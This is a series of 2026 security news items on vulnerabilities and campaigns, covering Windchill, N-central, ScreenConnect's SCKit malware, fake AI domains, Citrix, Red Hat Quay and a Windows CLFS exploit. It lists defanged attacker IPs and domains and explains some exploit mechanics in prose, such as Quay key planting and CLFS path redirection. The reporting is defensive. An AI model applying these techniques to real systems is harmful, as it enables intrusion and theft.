item.title: PTC Patches Critical Windchill and FlexPLM Flaw That Could Enable Remote Code Execution (2026)
item.description:
PTC has released patches for a new critical vulnerability impacting Windchill and FlexPLM software that, if successfully exploited, could result in remote code execution.

The security flaw, tracked as CVE-2026-126325, carries a CVSS v4 score of 9.2 out of a maximum of 10.0.

It has been described as a case of improper input validation and deserialization of untrusted data that could result in remote code execution via crafted requests.

"A critical remote code execution (RCE) vulnerability has been reported in PTC Windchill and PTC FlexPLM," according to a description of the flaw on CVE.org. "The vulnerability may be exploited through the deserialization of untrusted data."

The CVE record lists the following versions as affected -

  • PTC Windchill: 11.0 M030, 11.1 M020, 11.2.1.0, 12.0.2.0, 12.1.2.0, 13.0.2.0, 13.1.0.0, 13.1.1.0, 13.1.2.0, 13.1.3.0, 13.1.4.0
  • PTC FlexPLM: 11.0 M030, 11.1 M020, 11.2.1.0, 12.0.2.0, 12.1.2.0, 13.0.2.0, 13.1.0.0, 13.1.1.0, 13.1.2.0, 13.1.3.0

"If your Windchill or FlexPLM environment is hosted by PTC, the patches have been applied on their behalf. No action is required on your part," PTC said in a statement posted on its website.

"If your Windchill or FlexPLM environment is not hosted by PTC, we urge you to apply the patch as soon as possible to help protect your systems."

The disclosure comes nearly five months after another critical remote code execution (RCE) issue in Windchill and FlexPLM (CVE-2026-12569, CVSS score: 9.3) came under active exploitation.

Then, in July 2026, it emerged that threat actors linked to the Cl0p ransomware operation were weaponizing the flaw as part of a data extortion campaign designed to drop JSP web shells and exfiltrate sensitive product data from manufacturing companies and industrial enterprises.

"PTC software is a textbook target for initial access brokers and ransomware operators and a significant enabler of triple extortion campaigns," Yordan Ganchev, principal threat intelligence specialist at watchTowr, said in a statement shared with The Hacker News.

"It allows malicious actors to reach far and wide within victim networks, encrypt and exfiltrate proprietary data, and disrupt industrial processes. In many cases, the impact across these environments has downstream implications for time-sensitive manufacturing, logistics, and fulfillment processes, resulting in material costs per hour of downtime."

Organizations running PTC Windchill and FlexPLM products are recommended to patch exposed systems as soon as possible and monitor for signs of code execution, backdoor access, or web shells on the host. If patching is not an immediate option, it's essential to apply network restrictions to limit the risk of compromise.

item.title: Calendar Invites and Live Proxies: Inside a Google Session Hijacking Campaign (2026)
item.description:
Since mid-August 2026, a phishing operation has been stealing live Google sessions from corporate users. Every check defenders normally lean on to judge a link came back clean, and the operator designed it that way on purpose.

The Threat Research team at Material Security spotted the campaign and has since taken down hundreds of attacker domains in an effort the team calls Operation CloudFire. Here’s what the researchers found.

The lure: Google Calendar invites

The messages show up as Google Calendar invites. Some arrive by BCC, and many come from an organization the recipient has already traded email with. The pretexts are deliberately boring: voicemail notifications, RFP and RFI requests, court summonses, and missed payment notices. Nothing about them stands out in a busy inbox.

Most of the links point to Google itself. The usual pattern runs through Google’s own /url redirector, with the real destination tucked into a query parameter. Other waves used share.google and Drive file links the same way, and one variant leaned on Intuit transaction notification links. Whenever a message gets scored, the domain, certificate, and reputation on display are all legitimate.

The capture: a reverse proxy in front of Google sign-in

Once a victim clicks through, the attacker runs a live reverse proxy in front of the real Google sign-in page. The victim types a password, gets a genuine prompt, and approves it while the operator watches in real time. The server passes each second factor along to Google as it comes in, whether that’s an SMS code, an authenticator code, Google’s Tap-Yes number matching, or phone-based account recovery. None of those controls stop the session from being captured.

The framework behind it, known as Nyasher, has been publicly documented since February, after researchers found a hardcoded key in its JavaScript.

Why the usual controls stay quiet

Reputation systems answer questions about ownership. They ask who registered a domain, what else it has hosted, and whether anyone has complained about it. This campaign was built so every one of those answers came back harmless.

It works in three layers. The first is Google’s redirector, which gives the initial hop a trusted Google URL. The second is a Cloudflare Turnstile challenge, and in some builds it’s the real widget served from Cloudflare’s own infrastructure. The third is the password capture page, and that’s where things get tricky for defenders. There’s no static site to scan. JavaScript builds the page in the browser after the visitor clears the challenge, so a crawler has nothing to fetch and a proxy log has nothing to record. As far as the researchers know, nobody had scanned those pages before the campaign was documented.

The infrastructure is also meant to be thrown away. Early waves used many lure domains spread across several registrars, and most were registered just days before use. Receiving endpoints went live one to twenty days ahead of the wave they served. One wildcard certificate was issued 46 minutes before the domain it covers was even registered. Blocking any single piece costs the operator a few dollars and an afternoon.

What stopping it took

Researchers tracked the campaign from the start, following each variant as lures, gates, and endpoints rotated. Once detections were in place, they caught more than 99% of the malicious messages, with a reclassification rate of 0.01%. It’s been steady work, since the attacker kept changing tactics, themes, and lure text to slip past static, machine learning, and agentic detections.

What worked was refusing to let any one signal make the call. Reputation alone wouldn’t have caught this. Neither would link analysis, since the first hop is a Google URL and the final page doesn’t exist until a browser builds it. Instead, the detection approach weighs technical indicators alongside the apparent intent of the message, where its links actually end up, and the sending relationship behind it. Any one of those can be enough to act on. A detection built around a single signal inherits that signal’s blind spots, and this operator has put real effort into mapping them.

Where the analysis happens matters too. Gateways built to inspect mail in transit aren’t a great fit for calendar invites, and much of this campaign arrives as invites. Calendar invites need to be treated as a threat surface of their own, with the account’s full history used as context next to the technical signals.

Where the damage lands

A hijacked session leaves its trail in Google Workspace audit logs. A live session reaches mail, Drive, and the ability to grant OAuth access in the victim’s name, so the blast radius goes well past the inbox.

That raises a couple of hard questions for security teams. Who’s actually reviewing those audit logs, and how fast can they act on what they find? Could the team revoke sessions, contain OAuth grants, and reset the affected account within an hour? Plenty of programs can’t, and an attacker holding a live session can do a lot in an hour.

Operation CloudFire: going after the infrastructure

By late September, the researchers decided that tuning rules, retraining models, and updating agents wouldn’t solve this alone. Detection protects customers, but it does nothing about an operator who’s already prepping the next wave. So the team went after the infrastructure.

Analysts pulled the gateway and backend URLs as messages were being sent and reported them through Cloudflare’s abuse reporting system. Cloudflare’s abuse team confirmed the fake interstitial and the proxied Google sign-in page behind it, then put its own phishing warning in front of those destinations.

That had two effects. First, the attacker’s infrastructure got burned. Every reported gateway and endpoint had to be re-registered, re-pointed, and re-certified before the operator could send again. Second, it protected people well beyond any one company’s customers. Anyone who clicked a reported link saw a warning page instead of a credential form.

One month by the numbers

These figures only cover organizations that agreed to share data, so the real totals are higher. Over one month of Operation CloudFire, researchers recorded:

  • 68,676 campaign messages blocked
  • 2,112 unique malicious URLs analyzed
  • 897 unique domains taken down
  • 8,570 unique compromised sender addresses across 6,354 root domains

The messages also followed a clear rhythm, with sends tracking US business hours.

Message delivery by time of day

The sender count explains how the campaign earned trust. The attacker controlled each compromised account before the first invite went out, and each one sent invites to the account owner’s saved contacts, among others. Recipients saw a name or domain they knew, on a domain with a clean history, at a sensible time of day. Reputation feeds had no reason to flag any of it.

Where things stand now

The phishing themes have moved from calendar invites to Google Drive file and document share invites. Researchers haven’t seen a matching jump in other lures or tactics, and activity from this group seems to have scattered. For now, the campaign looks finished.

Messages detected by week
Domains registered by interval

That’s a snapshot, and it could change fast. Rebuilding the infrastructure is cheap, and the framework has been public since February. The operator also shipped an unfinished Microsoft 365 branch alongside the live Google code. It includes a stylesheet path, a second harness, and a title string that decodes to a Microsoft sign-in prompt. None of those paths resolve today, and adding the new brand would only mean dropping in a file, with no code changes. The follow-on is built and waiting.

The researchers see the theme rotation as ongoing iteration and expect the next pivot to look a lot like this one, just with a different brand on it.

The full technical breakdown, including indicators of compromise and a timeline, is in the companion whitepaper. Teams hunting for this activity in their own environments should start there.

item.title: New N-central Exploits Work Against Patched Servers, Enable Root RCE and Windows SYSTEM Access (2026)
item.description:
N-able on Thursday said it's investigating a new public disclosure containing claims of additional vulnerabilities in on-premise versions of N-central running version 2026.4.1 HF2.

"Based on our initial review, the server issue described depends on a non-default configuration in which the Legacy API is turned on and exposed to the public internet," N-able said in a new advisory. "Legacy API is turned off by default in the product and is not recommended."

The company is urging customers to disable Legacy API immediately, if not already. It also noted that hosted environments are not affected by this issue.

The incident impacts the following services -

  • N-central On-premise (Americas)
  • N-central On-premise (APAC)
  • N-central On-premise (Europe)

The development comes days after N-able released 2026.4.1.26 to address a number of security flaws disclosed by independent security researcher Sean Bales earlier this week. The vulnerabilities are collectively tracked under the name Able2Shell.

The new shortcoming, also revealed by Bales, have been codenamed 4EverAble2Shell and Agent2Shell, adding the proof-of-concept (PoC) exploits successfully work against N-central 2026.4 Hotfix 2 (build 2026.4.1.26), the update N-able released on November 10, 2026, to resolve Able2Shell.

According to the researcher, 4EverAble2Shell enables unauthenticated remote code execution with root privileges on N-central servers. Agent2Shell, on the other hand, leverages more than 10 zero-day vulnerabilities to run commands on managed Windows agents as NT AUTHORITY\SYSTEM, assuming the attacker knows the target appliance ID.

Ryan Dewhurst, founder and CEO of Previdian, told The Hacker News that targeted N-central probing has been observed against 4EverAble2Shell within hours following the release of the PoC. The activity has originated from the IP address 157.20.241[.]16. There is no evidence of successful exploitation as of writing.

In the attack chain observed by the threat intelligence company, threat actors have been observed attempting to achieve initial code execution through a recently disclosed Apache Axis flaw (CVE-2026-90436, CVSS score: 9.8), followed by attempts to escalate privileges to root using 4EverAble2Shell, and then download and execute a shell script from 157.20.241[.]16 using curl.

Dewhurst said the development marks the first documented instance of exploitation attempts aimed at CVE-2026-90436, patches for which were released on November 6, 2026.

In a post shared on X, watchTowr also said it's seeing probes for 4EverAble2Shell targeting N-Central builds with the Legacy API enabled.

(This is a developing story. Please check back for more information.)

item.title: Google Cloud Warns Three AMD Turin CPU Flaws Could Leak Data Across Processes in VMs (2026)
item.description:
Google Cloud VMs on AMD Turin chips need a guest OS patch and a stop-and-start to protect against three CPU side-channel flaws, Google said this week.

The company has already applied mitigations against attacks between VMs, and between VMs and the host. Inside a VM, the flaws may let an attacker with code on the same processor core infer data from other processes or the kernel.

The affected machine series are C4D, N4D, H4D, Z4D,, and G4, including bare-metal instances of C4D and Z4D. Turin is the code name for fifth-generation AMD EPYC processors.

All three flaws are Transient Scheduler Attacks (TSA). Two of them, TSA-SQ (CVE-2024-36350) and TSA-L1 (CVE-2024-36357), were first disclosed on July 8, 2025, for earlier EPYC processors.

AMD now says its Zen 5 processors, which include Turin, are "impacted differently from previously characterized AMD processors." The third flaw, CVE-2026-0004, is new. It may let an attacker who can run code on a system infer data in the processor's L1 data cache.

The Xen Project, which maintains the Xen hypervisor, calls the new flaw TSA-Fill. It also says an earlier statement has been corrected: "AMD had previously said that Zen5 CPUs were not vulnerable to TSA-SQ and TSA-L1."

Google rates the issue Medium. AMD classifies all three as local attacks with high attack complexity that require only low privileges, according to its Zen 5 bulletin and CVE-2026-0004 advisory.

As of today, none of the three is in the KEV catalog of exploited flaws kept by the U.S. Cybersecurity and Infrastructure Security Agency. Neither company reports any exploitation in its bulletins.

What Google Cloud Customers Need to Do

Google's security bulletin gives these steps for each service:

  • VMs: Install your OS vendor's fix when it ships. Starting this week, the company will update the CPU information that VMs report, so a patched guest kernel can turn on its mitigations. After that update reaches a VM, stop and start it. As the company puts it: "Rebooting the guest OS isn't enough."
  • Bare metal instances: If you run your own OS or hypervisor on a C4D or Z4D bare metal instance, apply your vendor's fixes when they are available.
  • Hypervisors inside a VM: The same CPU information update applies, so patched guest kernels can turn on their mitigations. Stop and start the VM once the update arrives.
  • GKE: Updated node images for Turin-based bare metal instances will be made available, and upgrading nodes picks up the CPU information update. As of today, the bulletin does not yet list them as available.
  • Cloud Run: No action is needed.

Customers on older Rome, Milan, and Genoa processors got the same stop-and-start instruction in an earlier bulletin at the time of the original disclosure on July 8, 2025.

The company lists nothing to do in the meantime for VMs whose OS vendor has not yet shipped a fix. It also does not say how to tell when the CPU information update has reached a VM.

A kernel commit that mitigates TSA on Zen 5, including the new variant, is in the Linux kernel source tree. As of today, Debian has fixed CVE-2026-0004 in its Linux kernel only in its unstable branch. Its security tracker still lists the kernels in bookworm, trixie, and forky as vulnerable.

For Turin servers on your own hardware, AMD says both platform firmware and OS updates are needed to mitigate the flaws fully. The mitigation may affect performance, and administrators should weigh the risk to their own workloads, according to its technical guidance.

The Xen Project has published hypervisor patches in its Xen advisory. It says microcode for all TSA flaws on Zen 5 has been in linux-firmware since September 23.

item.title: SCKit Malware Turns ScreenConnect Support Sessions Into Potential MSP Attack Paths (2026)
item.description:
The ongoing campaign targeting ConnectWise ScreenConnect deployments involves the exploitation of a now-patched critical security flaw in the remote access software, and not a new vulnerability, it has emerged.

Blackpoint Cyber's Adversary Pursuit Group (APG), which shared the details with The Hacker News, said the recovered attacker toolkit exploits CVE-2026-84869 (CVSS score: 9.9), an improper privilege management and missing authorization vulnerability that could allow an attacker to file transfer and execute through an active remote session without authorization or host confirmation.

The cybersecurity company confirmed that testing against a fully patched ScreenConnect client successfully prevents execution of the exploit's payload.

"Our testing confirmed that the exploit targets CVE-2026-84869 and that the existing patch successfully blocks it," APG researchers Sam Decker and Nevan Beal said. "That's an important finding for security teams."

"But the toolkit also includes capabilities to hijack authenticated operator sessions and use legitimate ScreenConnect management features to push malicious code. Patching addresses the known exploit, but it doesn't eliminate the risks associated with a compromised operator session."

Notably, the SCKit malware contains functionality called RelayTrap to reverse-pivot to infect the workstations of technicians who attempt to investigate suspicious activity in a managed endpoint. In other words, the activity abuses trusted functionality and does not rely on a software vulnerability once an attacker obtains a valid session.

The attack sequence makes use of the platform's built-in Run Command functionality to execute commands. This involves first checking for an existing ScreenConnect installation before downloading and running an attacker-controlled MSI installer ("sc.msi"), which then delivers the batch script dropper ("sckit-run.bat").

The batch script dropper subsequently contacts "ns.mo7sen[.]dev" to fetch a PowerShell decoder ("sckit-decoder.ps1") and ultimately deploy various components associated with the SCKit toolkit.

This includes a PowerShell script ("SilentForceInstall-WithUninstall.ps1") used to establish persistent remote access by deploying two unauthorized ScreenConnect Access clients, along with a set of scripts and C# code designed to interfere with existing ScreenConnect Guest sessions, including RelayTrap.

The component attempts a guest-to-host file execution technique associated with CVE-2026-84869 by replacing the legitimate ScreenConnect Guest and sending the SCKit payload back toward the connecting technician for execution.

If this action is successful, the malware tries to recover the technician's authenticated ScreenConnect browser sessions and leverage their existing management permissions to distribute commands across additional endpoints they have access to. As a result, an attacker can move beyond the original compromised system and into other customer environments through the same infrastructure used to administer them.

"Because these commands were executed through existing ScreenConnect agents, the attackers could deploy additional software under the NT AUTHORITY\SYSTEM context without needing to establish a separate execution method on each machine," Blackpoint Cyber said.

"The unauthorized Access clients provide attackers with persistent control over the endpoint, while the RelayTrap components position the malware to intercept legitimate support connections. Rather than simply preventing administrators from accessing an infected machine, the toolkit attempts to use their next connection as an opportunity to extend the intrusion directly to the technician's workstation."

The end goal of the attack appears to target technicians, as they regularly connect to managed endpoints belonging to different customers, typically from workstations with access to administrative tools and authenticated management sessions. This enables the attackers to break out of the original endpoint and move the intrusion into an environment with potentially broader access and privileges.

Once the malware gets executed on the technician's machine, it shifts from remote support manipulation to session theft, searching the local browser data and process memory of the machine to recover an existing authenticated management session (i.e., .ASPXAUTH cookies) that can be used to propagate the malware to other endpoints without having to obtain their credentials.

"By first attempting to compromise a technician's workstation, then recover their authenticated ScreenConnect session, SCKit seeks to turn access to a single managed endpoint into an opportunity to reach other systems under that technician's control," the researchers said.

The Hacker News has contacted ConnectWise for comment, and we will update the story if we hear back.

It's worth noting that CVE-2026-84869 was previously exploited in a set of attacks in which threat actors leveraged ScreenConnect to distribute a malicious four-stage Visual Basic Script (VBScript) payload to newly connected systems and ultimately serve an XMRig cryptocurrency miner.

The vulnerability was added by the U.S. Cybersecurity and Infrastructure Security Agency (CISA) to its Known Exploited Vulnerabilities (KEV) catalog on September 11, 2026, requiring federal agencies to apply the fixes by September 14, 2026.

In response to the latest incident, ConnectWise has taken the precautionary step of disabling five third-party extensions in partner environments. However, Blackpoint Cyber said it found no technical link between those extensions and SCKit.

As of writing, there is no evidence that the activity has established successful propagation to a technician workstation or bypassed the vendor patch for CVE-2026-84869.

The findings reinforce the importance of patching ScreenConnect clients, and underscore the need for stronger operator-session protections, including tighter session validation and additional authentication for bulk administrative actions, Blackpoint Cyber noted.

"Organizations need to protect those sessions and put additional safeguards around high-impact administrative actions," the researchers said.

"For MSPs, the practical lesson is to investigate the management relationship, not only the endpoint. Rogue Access installations, administrative command history, technician workstations, and browser sessions all deserve attention, especially when support personnel have already connected to a suspected system."

RMM+ Authentication Flaw Found

Huntress, in an update, said it has identified a serious authentication flaw in versions 1.0.31 and 1.0.32 of RMM+, one of the five third-party ScreenConnect extensions that has already been blocked by ConnectWise.

"When an administrator had not configured an access key, the extension would accept a blank one, potentially allowing unauthorized commands to execute without going through ScreenConnect's normal authentication controls," the company said in a statement shared with The Hacker News.

RMM+ makes it possible for another tool to manage ScreenConnect sessions without a technician working through the console. It authenticates requests with a shared access key ("RMMPlus.AccessKey") stored in the extension's settings. However, in versions 1.0.31 and 1.0.32, the key defaults to a blank value.

Because RMM+ operates independently of ScreenConnect's normal user accounts, roles, and authentication controls, an attacker could potentially execute commands on the device without bypassing multi-factor authentication.

"Commands reached endpoints across several ScreenConnect instances within minutes. There was no corresponding login activity and the commands appeared in the logs reviewed linked to RMM+."

It's worth mentioning here that while the toolkit possesses capabilities to exploit CVE-2026-84869, there is no evidence to suggest that an unpatched ScreenConnect client was the initial entry point for the attack.

"At this time, initial access appears to be linked to malicious ScreenConnect extensions, although we do not have sufficient evidence to confirm this," Beal, principal MDR analyst at Blackpoint, told The Hacker News.

"Identifying patient zero would require additional forensic evidence from affected environments. Similarly, while November 11 marks the earliest publicly reported activity, we cannot rule out earlier compromises without further investigation. Our findings confirm the toolkit's capabilities but do not establish when or how the initial compromise occurred."

When contacted for comment, a ConnectWise spokesperson told The Hacker news that it's aware of reports of malicious activity affecting a limited number of ScreenConnect partners and that it's actively investigating the incident.

"While the initial access method remains unconfirmed, our initial assessment suggests the activity may involve a threat actor's abuse of independent third-party extensions installed in partner environments," the spokesperson said.

"We have disabled the identified extensions where we can take action as a precaution and are advising on-premises partners to disable them immediately. The presence of these extensions alone does not establish compromise. We encourage partners to review the precautionary guidance in the ConnectWise Trust Center, where we will provide updates as information is validated."

(The story was updated after publication to include responses and insights from ConnectWise, Blackpoint Cyber, and Huntress.)

item.title: 186 Fake AI Domains Redirect Users to ClickFix Lures, Browser Malware, and Search Hijackers (2026)
item.description:
Cybersecurity researchers have found that lookalike domains masquerading as artificial intelligence (AI) tools are being used to serve ClickFix-style lures, browser-hijacking malware, and a set of extensions that hijack user searches.

This delivery pattern has been codenamed TypoPrompting by Island.

"AI-app lookalikes that turn an attempt to reach a familiar tool into a prompt to verify, install or run something else," the cybersecurity company said in a report shared with The Hacker News.

In all, the campaign spans 186 bogus domains spanning 27 AI brands, including Anthropic Claude, OpenAI ChatGPT, Google Gemini and Gemini Notebook (formerly NotebookLM), Microsoft Copilot, SpaceXAI Grok, DeepSeek, Mistral, Perplexity, Midjourney, ElevenLabs, Lovable, and Cursor.

While one category leads to a ClickFix lure that serves a PowerShell command via a fake Cloudflare verification page, the second route takes unsuspecting users to "Security Check" pages that deliver a browser-hijacking malware called Net Guard. The third pathway sends users to a search-hijack extension family with 16 live Chrome Web Store listings and 972,000 declared users.

Some of the AI lookalike domains are listed below -

  • cloude[.]ai
  • cluade[.]ai
  • clsude[.]ai
  • chatlgpt[.]com
  • geimini[.]com
  • notebookklm[.]com
  • griok[.]com
  • preplexity[.]ai
  • deepceek[.]com
  • elevenlebs[.]io
  • copiot[.]com
  • midj0urney[.]org

An analysis of registration records shows that some of these domains, like cloude[.]ai and cluade[.]ai, were registered as early as July 13, 2023.

The use of parked domains for malware delivery is not new. In December 2025, Infoblox highlighted how domains without a current web page can be monetized to redirect visitors to sites that serve scams and malware after profiling the host and the device they are visiting from.

"When a domain owner opts into direct search, traffic to the domain is sold to advertisers who bid on keywords and traffic characteristics," the DNS threat intelligence firm noted at the time. "In practice, the site visitor is usually funneled through a series of traffic distribution systems (TDSs) operated by third-party advertising platforms, creating a complex web where a legitimate business model is weaponized for abuse."

In the case of the ClickFix route, the parked page initiates a redirect chain that fingerprints the web browser and collects the public IP address before displaying the fake Cloudflare verification page.

Island said the fingerprint gate script spans a broader set of 211 entry domains, including lookalikes of banks, insurers, and enterprise software, such as Scotiabank, Charles Schwab, Blue Cross Blue Shield, Verizon, ServiceNow, and Microsoft Azure.

These domains serve three types of lures -

  • Fake verification pages on Windows that are designed to run a clipboard command
  • Terminal or security updates on macOS that are designed to run a shell command
  • Archive download pages that instruct users to extract and run an executable

Separately, eight typosquat domains for Claude, DeepSeek, Copilot, ElevenLabs, and Voice AI lead to fake "Security Check" pages that ultimately deliver Net Guard.

While the app purports to be a Wi-Fi and DNS safety scanner and matches the MSIX hash for a legitimate app of the same name, it contains capabilities to run attacker-controlled JavaScript, change the default search engine while the user is idle, edit browser profiles, and install arbitrary Chrome extensions.

"The download from the 'Security Check' pages is the Microsoft Store app itself, unmodified," Oleg Zaytsev, Lead Security Researcher at Island, told The Hacker News. "It is byte-for-byte identical to Net Guard as Microsoft distributes it, and it carries Microsoft’s own Store signature."

"The hidden browser control comes with every copy, whether installed from the Store or from a typo site, and it switches itself on without asking. It waits until the user stops using the computer, then takes over Chrome's search settings and can run scripts inside the browser, following instructions from the operator's server."

The third route revolves around a lookalike domain for Perplexity ("preplexity[.]ai"), which redirects the browser to a browser extension called Quick Search that's available on the Chrome Web Store.

"The analyzed extension needs no executable JavaScript or declared permissions to perform its main action," Island said. "Its manifest overrides the default search provider with find.flashysearches[.]com . Searches made through that provider are sent to a third party. In a workplace, those queries can include internal hostnames, customer names and project details."

Quick Search is part of a larger set of 16 extensions, including GPT for Chrome, which has 80,000 users. In all, the extensions collectively have 972,000 users as of November 3, 2026.

"An address one letter away from an AI tool can lead to a very different request," Island said. "As these services become part of everyday work, reaching the right one should be a managed path, not a test of typing accuracy."

(The story was updated after publication to include a response from Island.)

item.title: Citrix Patches 12 NetScaler and Secure Access Client Flaws, Including Authentication Bypass (2026)
item.description:
Citrix has released patches for multiple critical security flaws impacting NetScaler ADC, Citrix NetScaler Gateway, and NetScaler Console that could lead to denial-of-service (DoS) or an authentication bypass.

The critical vulnerabilities that impact NetScaler ADC and NetScaler Gateway are listed below -

  • CVE-2026-120868 (CVSS score: 9.3) - A memory overflow vulnerability in Packet Processing can lead to unpredictable or erroneous behavior or DoS. (All NetScaler ADC and NetScaler Gateway deployments)
  • CVE-2026-107407 (CVSS score: 9.3) - A memory overflow vulnerability in SMPP traffic can lead to unpredictable or erroneous behavior or DoS. (NetScaler ADC configured with a Load Balancing or Content Switching virtual server of type SMPP)
  • CVE-2026-107408 (CVSS score: 9.3) - A memory corruption vulnerability in DNS / DNS-over-HTTPS (DoH) can lead to unpredictable or erroneous behavior or DoS. (NetScaler ADC configured for DNS load balancing and recursive DNS resolution)
  • CVE-2026-107409 (CVSS score: 9.3) - A memory corruption vulnerability in DNS-over-HTTPS (DoH) can lead to unpredictable or erroneous behavior or DoS. (NetScaler configured with DNS Load Balancing over HTTPS)
  • CVE-2026-107410 (CVSS score: 9.3) - A memory overflow in NetScaler Push can lead to unpredictable or erroneous behavior or DoS. (NetScaler configured as Load Balancing virtual server  of type PUSH)
  • CVE-2026-107412 (CVSS score: 9.5) - Multiple memory overflow vulnerabilities can lead to unpredictable or erroneous behavior and DoS. (NetScaler configured as a Gateway or an AAA virtual server)
  • CVE-2026-107415 (CVSS score: 9.3) - A memory overflow vulnerability in Email OTP authentication can lead to unpredictable or erroneous behavior or DoS. (NetScaler ADC or NetScaler Gateway configured with an Email Action)
  • CVE-2026-111344 (CVSS score: 9.3) - A memory overflow vulnerability in Endpoint Analysis (EPA/EPAS) can lead to unpredictable or erroneous behavior or DoS. (NetScaler configured as a VPN virtual server or an authentication (AAA) virtual server with Endpoint Analysis)
  • CVE-2026-120864 (CVSS score: 9.3) - A memory overflow vulnerability in ICA proxy can lead to unpredictable or erroneous behavior or DoS. (NetScaler configured as a Gateway VPN virtual server, an AAA virtual server, or a CR virtual server of type HDX)

All the issues have been patched in the following versions -

  • Citrix NetScaler ADC and Citrix NetScaler Gateway 14.1-73.57 and later releases
  • Citrix NetScaler ADC and Citrix NetScaler Gateway 13.1-64.39 and later releases of 13.1
  • Citrix NetScaler ADC 14.1-FIPS 14.1-73.58 FIPS and later releases of 14.1-FIPS
  • Citrix NetScaler ADC 13.1-FIPS and 13.1-NDcPP 13.1-37.293 and later releases of 13.1-FIPS and 13.1-NDcPP

Also addressed by Citrix are a number of flaws in NetScaler Console and Secure Access Client for Windows and Linux -

  • CVE-2026-120869 (CVSS score: 9.4) - An improper authentication vulnerability in NetScaler Console can allow an unauthenticated attacker to bypass authentication controls to access restricted resources on the appliance. (Fixed in NetScaler Console 14.1-74.34 and later)
  • CVE-2026-118268 (CVSS score: 8.5) - An improper privilege management vulnerability in Secure Access Client for Windows can allow a low-privileged user to escalate privileges to SYSTEM. (Fixed in Secure Access Client for Windows 26.11.1.6 and later)
  • CVE-2026-118269 (CVSS score: 8.5) - An improper privilege management vulnerability in Secure Access Client for Linux can allow a low-privileged user to gain root privileges. (Fixed in Secure Access Client for Linux 26.10.4 and later)

The security updates, Citrix said, follow a deeper review of its codebase by integrating artificial intelligence (AI)-assisted code analysis to detect and resolve vulnerabilities with an aim to harden the products before potential threats could materialize.

The company said it's not aware of any exploits for any of the announced vulnerabilities, but urged customers to apply the updates as they are designed to "enhance the security posture of NetScaler."

item.title: Critical Red Hat Quay Flaw Lets Attackers Read and Overwrite All Private Container Images in a Registry (2026)
item.description:
A critical flaw in Red Hat Quay allows an attacker who can access a Quay registry to read and overwrite private container images in every repository.

Quay enables anonymous access by default, and while it is enabled, the attacker needs no account. When it is off, anyone with a valid account can still exploit the flaw, Red Hat said yesterday. The company has released fixed builds for eight Quay 3 branches.

The flaw is tracked as CVE-2026-123710 (CVSS score: 9.8).

Quay uses keys it trusts to sign the access tokens that allow image pushes and pulls. The flaw lets an attacker add their own key to the keys Quay trusts, with no expiry date. Quay then accepts tokens signed with that key for any repository.

With those tokens, an attacker can retrieve private images and any secrets or credentials stored within them. The attacker can also push or overwrite images, and the change propagates to every system that later pulls those images.

The planted key survives restarts until someone removes it. It can also be used to delete the keys that running Quay instances use, so normal pushes and pulls start failing with authentication errors.

Quay's key server checks that a request to replace a key carries a token signed by a trusted key, with the expected audience and issuer. It does not check whether the token was issued for key rotation. An anonymous token from Quay's /v2/auth endpoint passes: Quay signs it with a trusted key, and the caller chooses its audience.

A second critical flaw, CVE-2026-110697 (CVSS score: 9.9), was disclosed at the same time. It lets a Quay user who can create a namespace steal other tenants' robot account tokens and use them to read, push, or overwrite those tenants' images.

This flaw is in the code that lists robot accounts. It builds an SQL LIKE pattern from the namespace name without escaping wildcard characters, and in SQL LIKE an underscore matches any single character.

So a namespace with an underscore in the right place can match another tenant's namespace and return its robot accounts, with their decrypted tokens. The attacker needs no elevated privileges, and the victim does not have to do anything.

Deleting the attacker's namespace also deletes the corresponding robot accounts, which can cut off systems that rely on them. Where Quay is the integrated registry for OpenShift, stolen robot credentials can be used to inject malicious images into CI/CD pipelines, the company says.

Red Hat's Dave O'Connor found both flaws. The logic behind CVE-2026-123710 has been in Quay since its first public commit, according to the bug report for that flaw.

Red Hat lists every version of Quay 3 and Quay 5 as affected by both flaws. For CVE-2026-123710, its guidance names standalone installs, Quay deployed by the Quay Operator on OpenShift, and the mirror registry for Red Hat OpenShift as affected.

Any Quay instance that untrusted clients can reach is exposed, including internal registries, the company says.

When checked today, the CVE entry for CVE-2026-123710 still showed every Quay package as affected, with no fix, even though each advisory lists the flaw.

The company recommends these steps:

  1. At the proxy or load balancer, block the /keys endpoint for everything except trusted internal components.
  2. Search the audit logs for service_key_rotate and service_key_delete events where expiration_date is null.
  3. Remove any approved service keys you do not recognize.
  4. Install the fixed release. Until it is running, an attacker can add a new key the same way, so deleting one does not last.

"Turning off anonymous access doesn't protect you," the company says in its key remediation article. A planted key also continues to work after password resets and changes to the robot token.

For CVE-2026-110697, the company's CVE page names the same eight releases as fixed, calls updating the only complete fix, and says Quay.io is already fixed. But none of the eight advisories list CVE-2026-110697.

Until an update is in place, the company suggests limiting who can create organizations or namespaces containing an underscore, rotating robot tokens for any namespace that matches an underscore namespace, and watching for pulls or pushes that do not fit normal robot use. These steps reduce the exposure, but the flaw remains.

The upstream fix adds the missing rotation check, requires keys added through the key server to have an expiry date, and stops callers from choosing a token's audience. The same change fixes the robot account search too.

item.title: New SignDrop Zero-Day Exploit Turns Windows CLFS Security Feature Into SYSTEM Access (2026)
item.description:
Public exploit code released earlier this week claims that a local Windows user can gain SYSTEM privileges through the Common Log File System driver.

The proof of concept, called SignDrop, targets a log-authentication feature added to the driver last year. It abuses how clfs.sys creates companion files when a privileged process opens a prepared log, using path redirection to take control of the operation. Microsoft has not confirmed the claimed flaw, assigned a CVE, or released a fix.

The researcher behind the exploit, who publishes under the name MSNightmare, released the code and a detailed writeup on GitHub on Tuesday, the same day the company published its November security updates.

CLFS is a logging subsystem built into Windows. Its driver has been a frequent target for privilege escalation: 10 CLFS flaws appear in CISA's catalog of vulnerabilities known to have been exploited in attacks, including one used in ransomware campaigns in April 2025.

To reduce that exposure, Microsoft added an authentication check to CLFS log files in updates for Windows 11 25H2, 26H1, and Windows Server 2025 shipped in October 2025. The check attaches a hash-based message authentication code, built from log data and a key unique to each machine.

The driver then parses only log files it wrote. A companion .cnpf file stores recovery data beside each log and is created with the same security attributes as the original, according to the company's logfile authentication page.

SignDrop targets the creation of that companion file. According to the proof-of-concept code, a standard user prepares a CLFS log and container with paths the user controls. When a privileged process later opens that log, the driver creates the .cnpf file in the privileged process's security context rather than the user's.

The exploit uses object manager symbolic links to redirect that file creation to a location the attacker chooses. In the published code, the privileged process is the Defender antimalware service, triggered through its update interface.

"Everything is done properly by Microsoft here but the logic allows abuse," the researcher wrote.

Because the .cnpf file inherits the original log's permissions, the result is a file created as SYSTEM that the standard user can write to. The researcher says that can be chained into a SYSTEM shell.

